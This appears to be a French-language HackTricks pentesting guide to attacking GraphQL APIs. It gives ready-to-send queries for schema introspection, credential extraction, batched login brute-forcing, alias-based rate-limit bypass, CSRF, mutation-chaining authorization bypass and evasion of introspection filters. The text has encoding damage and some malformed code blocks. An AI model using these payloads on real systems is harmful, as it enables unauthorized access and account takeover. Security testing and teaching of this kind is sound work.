# GraphQL

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Introduction

GraphQL se pr√©sente comme une alternative √† l'API REST. Les API REST n√©cessitent que le client envoie plusieurs requ√™tes √† diff√©rents points de terminaison de l'API pour interroger les donn√©es de la base de donn√©es backend. Avec GraphQL, vous n'avez besoin d'envoyer qu'une seule requ√™te pour interroger le backend. C'est beaucoup plus simple car vous n'avez pas √† envoyer plusieurs requ√™tes √† l'API, une seule requ√™te peut √™tre utilis√©e pour rassembler toutes les informations n√©cessaires.

## GraphQL

Avec l'√©mergence de nouvelles technologies, de nouvelles vuln√©rabilit√©s apparaissent √©galement. Par **d√©faut**, GraphQL n'impl√©mente **pas** l'**authentification**, cela est laiss√© √† l'impl√©mentation du d√©veloppeur. Cela signifie que par d√©faut, GraphQL permet √† quiconque de l'interroger, toute information sensible sera disponible pour les attaquants non authentifi√©s.

Lorsque vous effectuez vos attaques de force brute sur les r√©pertoires, assurez-vous d'ajouter les chemins suivants pour v√©rifier les instances GraphQL.

* `/graphql`
* `/graphiql`
* `/graphql.php`
* `/graphql/console`
* `/api`
* `/api/graphql`
* `/graphql/api`
* `/graphql/graphql`

<figure><img src="../../.gitbook/assets/image (6) (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Une fois que vous trouvez une instance GraphQL ouverte, vous devez savoir **quelles requ√™tes elle prend en charge**. Cela peut √™tre fait en utilisant le syst√®me d'introspection, plus de d√©tails peuvent √™tre trouv√©s ici : [**GraphQL : Un langage de requ√™te pour les API.**\
Il est souvent utile de demander √† un sch√©ma GraphQL des informations sur les requ√™tes qu'il prend en charge. GraphQL nous permet de le faire‚Ä¶](https://graphql.org/learn/introspection/)

### Empreinte

L'outil [**graphw00f**](https://github.com/dolevf/graphw00f) est capable de d√©tecter quel moteur GraphQL est utilis√© sur un serveur, puis imprime des informations utiles pour l'auditeur de s√©curit√©.

#### Requ√™tes universelles <a href="#universal-queries" id="universal-queries"></a>

Si vous envoyez `query{__typename}` √† n'importe quel point de terminaison GraphQL, il inclura la cha√Æne `{"data": {"__typename": "query"}}` quelque part dans sa r√©ponse. C'est ce qu'on appelle une requ√™te universelle, et c'est un outil utile pour sonder si une URL correspond √† un service GraphQL.

La requ√™te fonctionne parce que chaque point de terminaison GraphQL a un champ r√©serv√© appel√© `__typename` qui renvoie le type de l'objet interrog√© sous forme de cha√Æne.

### √ânum√©ration de base

GraphQL prend g√©n√©ralement en charge **GET**, **POST** (x-www-form-urlencoded) et **POST**(json). Cependant, pour des raisons de s√©curit√©, il est recommand√© de n'autoriser que le json pour pr√©venir les attaques CSRF.

#### Introspection

Pour utiliser l'introspection afin de d√©couvrir des informations sur le sch√©ma, interrogez le champ `__schema`. Ce champ est disponible sur le type racine de toutes les requ√™tes.
```bash
query={__schema{types{name,fields{name}}}}
```
```graphql
{
  __schema {
    types {
      name
  }
}
```
{% endcode %}

Avec cette requ√™te, vous trouverez le nom de tous les types utilis√©s :
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
```markdown
Avec cette requ√™te, vous pouvez extraire tous les types, leurs champs et leurs arguments (ainsi que le type des arguments). Cela sera tr√®s utile pour savoir comment interroger la base de donn√©es.

![](<../../.gitbook/assets/image (207) (3).png>)

**Erreurs**

Il est int√©ressant de savoir si les **erreurs** vont √™tre **affich√©es** car elles apporteront des **informations** utiles.
```
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
![](<../../.gitbook/assets/image (205) (1).png>)

**√ânum√©ration du sch√©ma de base de donn√©es via l'introspection**

{% hint style="info" %}
Si l'introspection est activ√©e mais que la requ√™te ci-dessus ne s'ex√©cute pas, essayez de retirer les directives `onOperation`, `onFragment` et `onField` de la structure de la requ√™te.
{% endhint %}
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
Requ√™te d'introspection en ligne :
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
La derni√®re ligne de code est une requ√™te graphql qui extraira toutes les m√©tadonn√©es de graphql (noms d'objets, param√®tres, types...)

![](<../../.gitbook/assets/image (206).png>)

Si l'introspection est activ√©e, vous pouvez utiliser [**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager) pour visualiser dans une interface graphique toutes les options.

### Interrogation

Maintenant que nous savons quel type d'informations est enregistr√© dans la base de donn√©es, essayons d'**extraire certaines valeurs**.

Dans l'introspection, vous pouvez trouver **quel objet vous pouvez interroger directement** (car vous ne pouvez pas interroger un objet simplement parce qu'il existe). Dans l'image suivante, vous pouvez voir que le "_queryType_" est appel√© "_Query_" et que l'un des champs de l'objet "_Query_" est "_flags_", qui est √©galement un type d'objet. Par cons√©quent, vous pouvez interroger l'objet flag.

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-17-48.png)

Notez que le type de la requ√™te "_flags_" est "_Flags_", et cet objet est d√©fini comme ci-dessous :

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-22-57.png)

Vous pouvez voir que les objets "_Flags_" sont compos√©s de **name** et **value**. Ensuite, vous pouvez obtenir tous les noms et valeurs des flags avec la requ√™te :
```javascript
query={flags{name, value}}
```
Notez que si **l'objet √† interroger** est un **type primitif** comme une **cha√Æne de caract√®res** comme dans l'exemple suivant

![](<../../.gitbook/assets/image (441).png>)

Vous pouvez simplement l'interroger avec :
```javascript
query={hiddenFlags}
```
Dans un autre exemple o√π il y avait 2 objets √† l'int√©rieur de l'objet "_Query_": "_user_" et "_users_".\
Si ces objets ne n√©cessitent aucun argument pour la recherche, vous pourriez **r√©cup√©rer toutes les informations les concernant** en **demandant** simplement les donn√©es que vous voulez. Dans cet exemple d'Internet, vous pourriez extraire les noms d'utilisateur et mots de passe enregistr√©s :

![](<../../.gitbook/assets/image (208).png>)

Cependant, dans cet exemple, si vous essayez de faire cela, vous obtenez cette **erreur** :

![](<../../.gitbook/assets/image (210).png>)

Il semble que la recherche se fasse en utilisant l'argument "_**uid**_" de type _**Int**_.\
Quoi qu'il en soit, nous savions d√©j√† cela, dans la section [√ânum√©ration de base](graphql.md#basic-enumeration) une requ√™te avait √©t√© propos√©e qui nous montrait toutes les informations n√©cessaires : `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

Si vous lisez l'image fournie lorsque j'ex√©cute cette requ√™te, vous verrez que "_**user**_" avait l'**arg** "_**uid**_" de type _Int_.

Ainsi, en effectuant un l√©ger bruteforce sur _**uid**_, j'ai trouv√© que pour _**uid**=**1**_, un nom d'utilisateur et un mot de passe √©taient r√©cup√©r√©s :\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (211).png>)

Notez que j'ai **d√©couvert** que je pouvais demander les **param√®tres** "_**user**_" et "_**password**_" car si j'essaie de chercher quelque chose qui n'existe pas (`query={user(uid:1){noExists}}`), je re√ßois cette erreur :

![](<../../.gitbook/assets/image (213).png>)

Et pendant la **phase d'√©num√©ration**, j'ai d√©couvert que l'objet "_**dbuser**_" avait comme champs "_**user**_" et "_**password**_".

**Astuce pour le vidage de cha√Æne de requ√™te (merci √† @BinaryShadow\_)**

Si vous pouvez rechercher par un type de cha√Æne, comme : `query={theusers(description: ""){username,password}}` et que vous **cherchez une cha√Æne vide**, cela **videra toutes les donn√©es**. (_Notez que cet exemple n'est pas li√© √† l'exemple des tutoriels, pour cet exemple supposez que vous pouvez rechercher en utilisant "**theusers**" par un champ de type String appel√© "**description**"_).

GraphQL est une technologie relativement nouvelle qui commence √† gagner en popularit√© parmi les startups et les grandes entreprises. Outre l'absence d'authentification par d√©faut, les points de terminaison GraphQL peuvent √™tre vuln√©rables √† d'autres bugs tels que l'IDOR.

### Recherche

Pour cet exemple, imaginez une base de donn√©es avec des **personnes** identifi√©es par l'email et le nom et des **films** identifi√©s par le nom et la note. Une **personne** peut √™tre **amie** avec d'autres **personnes** et une personne peut **poss√©der des films**.

Vous pouvez **rechercher** des personnes **par** le **nom** et obtenir leurs emails :
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
Vous pouvez **rechercher** des personnes **par** **nom** et obtenir leurs **films** **abonn√©s** :
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
Notez comment il est indiqu√© de r√©cup√©rer le `name` des `subscribedMovies` de la personne.

Vous pouvez √©galement **rechercher plusieurs objets en m√™me temps**. Dans ce cas, une recherche de 2 films est effectu√©e :
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
Ou m√™me **les relations de plusieurs objets diff√©rents en utilisant des alias** :
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### Mutations

**Les mutations sont utilis√©es pour effectuer des changements c√¥t√© serveur.**

Dans l'**introspection**, vous pouvez trouver les **mutations** **d√©clar√©es**. Dans l'image suivante, le "_MutationType_" est appel√© "_Mutation_" et l'objet "_Mutation_" contient les noms des mutations (comme "_addPerson_" dans ce cas) :

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-26-27.png)

Pour cet exemple, imaginez une base de donn√©es avec des **personnes** identifi√©es par l'email et le nom, et des **films** identifi√©s par le nom et la note. Une **personne** peut √™tre **amie** avec d'autres **personnes** et une personne peut **poss√©der des films**.

Une mutation pour **cr√©er de nouveaux** films dans la base de donn√©es peut ressembler √† la suivante (dans cet exemple, la mutation est appel√©e `addMovie`) :
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**Remarquez comment les valeurs et le type de donn√©es sont indiqu√©s dans la requ√™te.**

Il peut √©galement y avoir une **mutation** pour **cr√©er** des **personnes** (appel√©e `addPerson` dans cet exemple) avec des amis et des films (notez que les amis et les films doivent exister avant de cr√©er une personne qui leur est li√©e) :
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### For√ßage brutal par lot en 1 requ√™te API

Cette information a √©t√© prise de [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/).\
Authentification via l'API GraphQL avec **l'envoi simultan√© de nombreuses requ√™tes avec diff√©rentes informations d'identification** pour les v√©rifier. C'est une attaque de force brute classique, mais il est maintenant possible d'envoyer plus d'une paire identifiant/mot de passe par requ√™te HTTP gr√¢ce √† la fonctionnalit√© de lot de GraphQL. Cette approche pourrait tromper les applications de surveillance de taux externes en leur faisant croire que tout va bien et qu'il n'y a pas de bot de force brute essayant de deviner des mots de passe.

Ci-dessous, vous pouvez trouver la d√©monstration la plus simple d'une requ√™te d'authentification d'application, avec **3 paires email/mot de passe diff√©rentes √† la fois**. De toute √©vidence, il est possible d'envoyer des milliers dans une seule requ√™te de la m√™me mani√®re :

![](<../../.gitbook/assets/image (182) (1).png>)

Comme nous pouvons le voir sur la capture d'√©cran de la r√©ponse, les premi√®re et troisi√®me requ√™tes ont renvoy√© _null_ et refl√©t√© les informations correspondantes dans la section _error_. La **deuxi√®me mutation avait les donn√©es d'authentification correctes** et la r√©ponse contient le jeton de session d'authentification correct.

![](<../../.gitbook/assets/image (119) (1).png>)

## GraphQL Sans Introspection

De plus en plus de **points de terminaison graphql d√©sactivent l'introspection**. Cependant, les erreurs que graphql g√©n√®re lorsqu'une requ√™te inattendue est re√ßue sont suffisantes pour des outils comme [**clairvoyance**](https://github.com/nikitastupin/clairvoyance) pour recr√©er la majeure partie du sch√©ma.

De plus, l'extension Burp Suite [**GraphQuail**](https://github.com/forcesunseen/graphquail) **observe les requ√™tes de l'API GraphQL passant par Burp** et **construit** un sch√©ma GraphQL interne avec chaque nouvelle requ√™te qu'elle voit. Elle peut √©galement exposer le sch√©ma pour GraphiQL et Voyager. L'extension renvoie une fausse r√©ponse lorsqu'elle re√ßoit une requ√™te d'introspection. En cons√©quence, GraphQuail montre toutes les requ√™tes, arguments et champs disponibles pour une utilisation au sein de l'API. Pour plus d'informations [**v√©rifiez ceci**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema).

Une bonne **liste de mots** pour d√©couvrir les [**entit√©s GraphQL peut √™tre trouv√©e ici**](https://github.com/Escape-Technologies/graphql-wordlist?).

### Contournement des d√©fenses d'introspection GraphQL <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

Si vous ne parvenez pas √† ex√©cuter des requ√™tes d'introspection pour l'API que vous testez, essayez d'ins√©rer un **caract√®re sp√©cial apr√®s le mot-cl√© `__schema`**.

Lorsque les d√©veloppeurs d√©sactivent l'introspection, ils pourraient utiliser une expression r√©guli√®re pour exclure le mot-cl√© `__schema` dans les requ√™tes. Vous devriez essayer des caract√®res comme les **espaces**, les **nouvelles lignes** et les **virgules**, car ils sont **ignor√©s** par GraphQL mais pas par des expressions r√©guli√®res d√©fectueuses.

Ainsi, si le d√©veloppeur a seulement exclu `__schema{`, alors la requ√™te d'introspection ci-dessous ne serait pas exclue.
```bash
#Introspection query with newline
{
"query": "query{__schema
{queryType{name}}}"
}
```
Si cela ne fonctionne pas, essayez d'ex√©cuter la sonde sur une m√©thode de requ√™te alternative, car l'introspection peut √™tre d√©sactiv√©e uniquement pour les requ√™tes POST. Essayez une requ√™te GET, ou une requ√™te POST avec un content-type de `x-www-form-urlencoded`.

### Structures GraphQL divulgu√©es

Si l'introspection est d√©sactiv√©e, essayez de regarder le code source du site web. Les requ√™tes sont souvent pr√©charg√©es dans le navigateur sous forme de biblioth√®ques javascript. Ces requ√™tes pr√©√©crites peuvent r√©v√©ler des informations pr√©cieuses sur le sch√©ma et l'utilisation de chaque objet et fonction. L'onglet `Sources` des outils de d√©veloppement peut rechercher dans tous les fichiers pour √©num√©rer o√π les requ√™tes sont sauvegard√©es. Parfois, m√™me les requ√™tes prot√©g√©es par l'administrateur sont d√©j√† expos√©es.
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## CSRF dans GraphQL

Si vous ne savez pas ce qu'est un CSRF, lisez la page suivante :

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

Vous trouverez de nombreux points de terminaison GraphQL **configur√©s sans jetons CSRF.**

Notez que les requ√™tes GraphQL sont g√©n√©ralement envoy√©es via des requ√™tes POST utilisant le Content-Type **`application/json`**.
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
Cependant, la plupart des points de terminaison GraphQL prennent √©galement en charge les **requ√™tes POST `form-urlencoded` :**
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
Par cons√©quent, comme les requ√™tes CSRF telles que les pr√©c√©dentes sont envoy√©es **sans requ√™tes de pr√©-vol**, il est possible d'**effectuer** des **changements** dans le GraphQL en abusant d'un CSRF.

Cependant, notez que la nouvelle valeur par d√©faut du cookie pour le drapeau `samesite` de Chrome est `Lax`. Cela signifie que le cookie ne sera envoy√© que dans les requ√™tes GET provenant d'un site tiers.

Notez qu'il est g√©n√©ralement possible d'envoyer la **requ√™te** **query** √©galement en tant que **requ√™te GET et que le jeton CSRF pourrait ne pas √™tre valid√© dans une requ√™te GET.**

De plus, en abusant d'une [**attaque XS-Search**](../../pentesting-web/xs-search.md), il pourrait √™tre possible d'exfiltrer du contenu de l'endpoint GraphQL en abusant des identifiants de l'utilisateur.

Pour plus d'informations, **consultez le** [**post original ici**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html).

## Autorisation dans GraphQL

De nombreuses fonctions GraphQL d√©finies sur l'endpoint peuvent uniquement v√©rifier l'authentification du demandeur mais pas l'autorisation.

La modification des variables d'entr√©e de la requ√™te pourrait conduire √† la fuite de d√©tails de compte sensibles [leak](https://hackerone.com/reports/792927).

La mutation pourrait m√™me conduire √† la prise de contr√¥le d'un compte en essayant de modifier les donn√©es d'autres comptes.
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### Contournement de l'autorisation dans GraphQL

[Encha√Æner les requ√™tes](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln) peut contourner un syst√®me d'authentification faible.

Dans l'exemple ci-dessous, vous pouvez voir que l'op√©ration est "forgotPassword" et qu'elle ne devrait ex√©cuter que la requ√™te forgotPassword qui lui est associ√©e. Cela peut √™tre contourn√© en ajoutant une requ√™te √† la fin, dans ce cas nous ajoutons "register" et une variable utilisateur pour que le syst√®me enregistre un nouvel utilisateur.

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## Contournement de la limite de taux en utilisant des alias

Normalement, les objets GraphQL ne peuvent pas contenir plusieurs propri√©t√©s portant le m√™me nom. Les alias vous permettent de contourner cette restriction en **nommant explicitement les propri√©t√©s que vous souhaitez** que l'API retourne. Vous pouvez utiliser des alias pour retourner **plusieurs instances du m√™me** type d'objet dans une seule requ√™te.

Pour plus d'informations sur les alias GraphQL, voir [Aliases](https://portswigger.net/web-security/graphql/what-is-graphql#aliases).

Bien que les alias soient destin√©s √† limiter le nombre d'appels API que vous devez effectuer, ils peuvent √©galement √™tre utilis√©s pour forcer brutalement un point de terminaison GraphQL.

De nombreux points de terminaison auront une sorte de **limiteur de taux en place pour pr√©venir les attaques par force brute**. Certains limiteurs de taux fonctionnent sur la base du **nombre de requ√™tes HTTP** re√ßues plut√¥t que sur le nombre d'op√©rations effectu√©es sur le point de terminaison. Parce que les alias vous permettent effectivement d'envoyer plusieurs requ√™tes dans un seul message HTTP, ils peuvent contourner cette restriction.

L'exemple simplifi√© ci-dessous montre une s√©rie de **requ√™tes aliass√©es v√©rifiant si les codes de r√©duction de magasin sont valides**. Cette op√©ration pourrait potentiellement contourner la limitation de taux car il s'agit d'une seule requ√™te HTTP, m√™me si elle pourrait potentiellement √™tre utilis√©e pour v√©rifier un grand nombre de codes de r√©duction √† la fois.
```bash
#Request with aliased queries
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## Outils

### Scanners de vuln√©rabilit√©s

* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler) : Bo√Æte √† outils pouvant √™tre utilis√©e pour r√©cup√©rer des sch√©mas et rechercher des donn√©es sensibles, tester l'autorisation, forcer brutalement des sch√©mas et trouver des chemins vers un type donn√©.
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html) : Peut √™tre utilis√© seul ou comme [extension Burp](https://github.com/doyensec/inql).
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap) : Peut √©galement √™tre utilis√© comme client CLI pour automatiser les attaques.
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum) : Outil qui liste les diff√©rentes mani√®res d'atteindre un type donn√© dans un sch√©ma GraphQL.
* [https://github.com/doyensec/inql](https://github.com/doyensec/inql) : Extension Burp pour des tests GraphQL avanc√©s. Le _**Scanner**_ est le c≈ìur d'InQL v5.0, o√π vous pouvez analyser un point de terminaison GraphQL ou un fichier de sch√©ma d'introspection local. Il g√©n√®re automatiquement toutes les requ√™tes et mutations possibles, les organisant dans une vue structur√©e pour votre analyse. Le composant _**Attacker**_ vous permet d'ex√©cuter des attaques GraphQL en lot, ce qui peut √™tre utile pour contourner des limites de taux mal impl√©ment√©es.

### Clients

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql) : Client GUI
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/) : Client GUI

### Tests automatiques

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* Vid√©o expliquant AutoGraphQL : [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## R√©f√©rences

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
